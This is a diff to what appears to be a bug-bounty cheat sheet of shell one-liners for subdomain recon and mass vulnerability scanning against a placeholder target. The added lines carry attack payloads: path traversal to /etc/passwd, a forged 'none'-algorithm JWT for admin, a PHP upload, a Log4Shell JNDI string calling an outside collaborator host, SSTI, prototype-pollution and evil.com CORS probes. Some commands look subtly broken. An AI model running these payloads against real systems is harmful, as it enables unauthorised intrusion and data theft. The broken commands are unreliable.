@@ -601,7 +601,6 @@ subfinder -d target.com | anew subs.txt && cat subs.txt | httpx -silent | hakraw
 ```bash
 subfinder -d target.com | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee tech_scan.txt && cat tech_scan.txt | nuclei -silent -t cves/
 ```
-Here are your automated recon and vulnerability scanning commands, streamlined for efficiency:
 
 ### Automated Asset Hunting + JS Analysis + Secret Finder
 ```bash
@@ -737,5 +736,73 @@ subfinder -d target.com | httpx -silent -path / -mc 200 -hdrs | nuclei -silent -
 ```bash
 subfinder -d target.com | dnsx -a -resp-only | anew all_ips.txt && cat all_ips.txt | xargs -I{} sh -c 'whois {} | grep -iE "OrgName|NetName|CIDR"' | tee whois_lookup.txt
 ```
+
+### Master Recon + Scan Pipeline (One-Liner)
+```bash
+subfinder -d target.com | tee subs.txt && cat subs.txt | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee tech_info.txt && cat subs.txt | hakrawler -subs -depth 3 | anew urls.txt && cat urls.txt | nuclei -silent -t cves/,misconfiguration/,takeovers/,panels/,redirect/ -o nuclei_findings.txt && cat urls.txt | gf xss,sqli,lfi,ssrf,redirect | qsreplace FUZZ | ffuf -u FUZZ -w payloads/xss.txt,payloads/sqli.txt,payloads/lfi.txt,payloads/ssrf.txt -fr "FUZZ" | tee param_scan.txt
+```
+
+### Additional Specific Recon + Vulnerability Scanning Commands
+
+#### Directory Traversal (Across All Endpoints)
+```bash
+cat all_urls.txt | gf lfi | qsreplace '../../../../../etc/passwd' | httpx -silent -fr 'root:x' -o traversal_hits.txt
+```
+
+#### Exposed Git Repos Finder (Automated)
+```bash
+subfinder -d target.com | httpx -silent -path /.git/HEAD -mc 200 -o exposed_git.txt
+```
+
+#### IDOR Discovery (Bruteforce Parameter Tampering)
+```bash
+cat all_urls.txt | gf idor | qsreplace 'id=123' | anew idor_urls.txt && qsreplace 'id=124' | httpx -silent -mc 200 -o possible_idor.txt
+```
+
+#### JWT Token Misconfig (None Algorithm)
+```bash
+cat all_urls.txt | grep -Ei 'jwt|token' | qsreplace 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.' | httpx -silent -mc 200 -o jwt_none.txt
+```
+
+#### Unrestricted File Upload (Testing Common Upload Points)
+```bash
+cat all_urls.txt | gf upload | qsreplace 'file=payload.php' | httpx -silent -upload-file payload.php -o upload_findings.txt
+```
+
+#### Path Confusion + Overlays (Detect Double Extensions)
+```bash
+cat all_urls.txt | sed 's/$/%00index.php/' | httpx -silent -mc 200 -o path_confusion.txt
+```
+
+#### CORS Wildcard + Credentials Misconfig
+```bash
+subfinder -d target.com | httpx -silent -path / -H 'Origin: https://evil.com' -hdrs | grep -i 'access-control-allow-origin' | grep 'evil.com' | tee weak_cors.txt
+```
+
+#### Log4Shell Finder (Old but Gold)
+```bash
+cat all_urls.txt | gf ssrf | qsreplace '${jndi:ldap://your-collaborator-url.burpcollaborator.net}' | httpx -silent
+```
+
+#### Server Side Template Injection (SSTI Detection)
+```bash
+cat all_urls.txt | gf ssti | qsreplace '{{7*7}}' | httpx -silent -fr '49' -o ssti_hits.txt
+```
+
+#### Prototype Pollution Detection (Direct & Indirect)
+```bash
+cat all_urls.txt | gf parameters | qsreplace '__proto__[exploit]=polluted' | httpx -silent -fr 'polluted' -o prototype_pollution.txt
+```
+
+#### Exposed Debug Pages (Stack Traces, Debug Consoles)
+```bash
+subfinder -d target.com | httpx -silent -path-list <(echo -e '/debug\n/_profiler\n/_debugbar\n/_error') -mc 200 -o debug_pages.txt
+```
+
+#### Email Leaks in JS Files
+```bash
+cat all_urls.txt | grep '\.js$' | xargs -I{} curl -s {} | grep -Eo "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | tee emails_found.txt
+```
+
 
 
